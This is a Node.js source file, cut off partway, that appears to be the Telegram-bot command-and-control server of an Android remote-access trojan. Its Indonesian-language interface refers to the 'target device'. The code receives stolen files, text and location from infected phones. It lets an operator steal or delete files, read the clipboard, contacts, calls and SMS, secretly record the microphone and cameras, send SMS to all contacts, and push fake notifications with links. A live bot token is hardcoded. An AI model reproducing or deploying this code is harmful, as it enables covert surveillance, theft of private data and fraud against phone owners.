const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6968340643:AAGpG6E6AhSY6feEFy8tUgvL6nq9ZdK20T4'
const id = '6966597966'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘼𝙠𝙩𝙞𝙛</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `[]𝙋𝙚𝙨𝙖𝙣 𝘿𝙖𝙧𝙞 <b>${req.headers.model}</b>[]`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `[]𝙋𝙚𝙨𝙖𝙣 𝘿𝙖𝙧𝙞 <b>${req.headers.model}</b>[]\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `[] 𝙇𝙤𝙠𝙖𝙨𝙞 𝘿𝙖𝙧𝙞 <b>${req.headers.model}</b>[]`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `[]𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝘽𝙖𝙧𝙪 𝙏𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜[]\n\n` +
        `• ɴᴀᴍᴀ ʜᴘ : <b>${model}</b>\n` +
        `• ʙᴀᴛʀᴇ : <b>${battery}</b>\n` +
        `• ᴠᴇʀsɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ɴᴀᴍᴀ sɪᴍ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `[]𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙏𝙚𝙧𝙥𝙪𝙩𝙪𝙨[]\n\n` +
            `• ɴᴀᴍᴀ ʜᴘ : <b>${model}</b>\n` +
            `• ʙᴀᴛʀᴇ : <b>${battery}</b>\n` +
            `• ᴠᴇʀsɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ɴᴀᴍᴀ sɪᴍ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('𝙎𝙞𝙡𝙖𝙠𝙖𝙣 𝘽𝙖𝙡𝙖𝙨 𝙉𝙤𝙢𝙤𝙧 𝙆𝙚 𝙈𝙖𝙣𝙖 𝘼𝙣𝙙𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙣𝙜𝙞𝙧𝙞𝙢 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙝𝙖𝙡𝙤, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢𝙠𝙖𝙣\n\n' +
                '• ʜᴀᴛɪ-ʜᴀᴛɪ ᴘᴇsᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴊɪᴋᴀ ᴊᴜᴍʟᴀʜ ᴋᴀʀᴀᴋᴛᴇʀ ᴅᴀʟᴀᴍ ᴘᴇsᴀɴ ᴀɴᴅᴀ ᴍᴇʟᴇʙɪʜɪ ʙᴀᴛᴀs ʏᴀɴɢ ᴅɪɪᴢɪɴᴋᴀɴ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙝𝙖𝙡𝙤, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢𝙠𝙖𝙣')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ sᴀᴀᴛ ᴍᴇɴᴅᴀᴛᴀɴɢ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙋𝙚𝙨𝙖𝙣 𝙔𝙖𝙣𝙜 𝙄𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙆𝙞𝙧𝙞𝙢 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙮𝙖𝙣𝙜 𝙖𝙣𝙙𝙖 𝙞𝙣𝙜𝙞𝙣𝙠𝙖𝙣 𝙠𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙨𝙚𝙗𝙚𝙧𝙖𝙥𝙖 𝙥𝙖𝙣𝙟𝙖𝙣𝙜 𝙖𝙣𝙙𝙖 𝙞𝙣𝙜𝙞𝙣 𝙠𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙣𝙙𝙞𝙧𝙞 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙩𝙚𝙧𝙖𝙥𝙠𝙖𝙣 𝙥𝙖𝙙𝙖 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙩𝙚𝙧𝙖𝙥𝙠𝙖𝙣 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙝𝙖𝙡𝙤, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙗𝙪𝙠𝙖 𝙤𝙡𝙚𝙝 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞\n\n' +
                '• ᴋᴇᴛɪᴋᴀ ᴋᴏʀʙᴀɴ ᴍᴇɴɢᴋʟɪᴋ ᴘᴇᴍʙᴇʀɪᴛᴀʜᴜᴀɴ, ᴛᴀᴜᴛᴀɴ ʏᴀɴɢ ᴀɴᴅᴀ ᴍᴀsᴜᴋɪ ᴀᴋᴀɴ ᴛᴇʀʙᴜᴋᴀ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙝𝙖𝙡𝙤, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙗𝙪𝙠𝙖 𝙤𝙡𝙚𝙝 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙖𝙪𝙙𝙞𝙤 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙢𝙖𝙞𝙣𝙠𝙖𝙣')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝙃𝙖𝙞, 𝙨𝙖𝙮𝙖 𝙗𝙤𝙩 𝙨𝙖𝙙𝙖𝙥 𝙟𝙖𝙧𝙖𝙠 𝙟𝙖𝙪𝙝 𝙗𝙮 𝙏𝙕𝙮𝙤𝙭𝘾𝙡\n\n' +
                '• ᴊɪᴋᴀ ᴀᴘʟɪᴋᴀsɪ ɪɴɪ ᴅɪɪɴsᴛᴀʟ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ, ᴛᴜɴɢɢᴜ ᴜɴᴛᴜᴋ ᴋᴏɴᴇᴋsɪ\n\n' +
                '• ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴇɴᴇʀɪᴍᴀ ᴘᴇsᴀɴ ᴋᴏɴᴇᴋsɪ, ɪᴛᴜ ʙᴇʀᴀʀᴛɪ ʙᴀʜᴡᴀ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ ᴛᴇʀʜᴜʙᴜɴɢ ᴅᴀɴ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴘᴇʀɪɴᴛᴀʜ\n\n' +
                '• ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴘᴇʀɪɴᴛᴀʜ ᴅᴀɴ ᴘɪʟɪʜ ᴘᴇʀᴀɴɢᴋᴀᴛ ʏᴀɴɢ ᴅɪɪɴɢɪɴᴋᴀɴ ᴋᴇᴍᴜᴅɪᴀɴ ᴘɪʟɪʜ ᴘᴇʀɪɴᴛᴀʜ ʏᴀɴɢ ᴅɪɪɴɢɪɴᴋᴀɴ ᴅɪ ᴀɴᴛᴀʀᴀ ᴘᴇʀɪɴᴛᴀʜ-ᴘᴇʀɪɴᴛᴀʜ\n\n' +
                '• ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛᴇʀᴊᴇʙᴀᴋ ᴅɪ sᴜᴀᴛᴜ ᴛᴇᴍᴘᴀᴛ ᴅɪ ʙᴏᴛ, ᴋɪʀɪᴍ ᴘᴇʀɪɴᴛᴀʜ /start',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙩𝙞𝙙𝙖𝙠 𝙖𝙙𝙖 𝙠𝙤𝙣𝙚𝙠𝙨𝙞 𝙮𝙖𝙣𝙜 𝙩𝙚𝙧𝙨𝙚𝙙𝙞𝙖\n\n' +
                    '• ᴘᴀsᴛɪᴋᴀɴ ᴀᴘʟɪᴋᴀsɪ ᴛᴇʀɪɴsᴛᴀʟ ᴅɪ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ'
                )
            } else {
                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝙖𝙥𝙡𝙞𝙠𝙖𝙨𝙞', callback_data: `apps:${uuid}`},
                        {text: '𝙞𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞 𝙃𝙋', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙖𝙢𝙗𝙞𝙡 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝙝𝙖𝙥𝙪𝙨 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝘾𝙖𝙢𝙚𝙧𝙖 𝘽𝙚𝙡𝙖𝙠𝙖𝙣𝙜', callback_data: `camera_main:${uuid}`},
                        {text: '𝘾𝙖𝙢𝙚𝙧𝙖 𝘿𝙚𝙥𝙖𝙣', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙡𝙤𝙠𝙖𝙨𝙞', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝙩𝙚𝙡𝙥𝙤𝙣', callback_data: `calls:${uuid}`},
                        {text: '𝙆𝙤𝙣𝙩𝙖𝙠', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
                        {text: '𝙩𝙖𝙢𝙥𝙞𝙡𝙠𝙖𝙣 𝙉𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙥𝙚𝙨𝙖𝙣', callback_data: `messages:${uuid}`},
                        {text: '𝙠𝙞𝙧𝙞𝙢 𝙋𝙚𝙨𝙖𝙣', callback_data: `send_message:${uuid}`}
                    ],
                    [
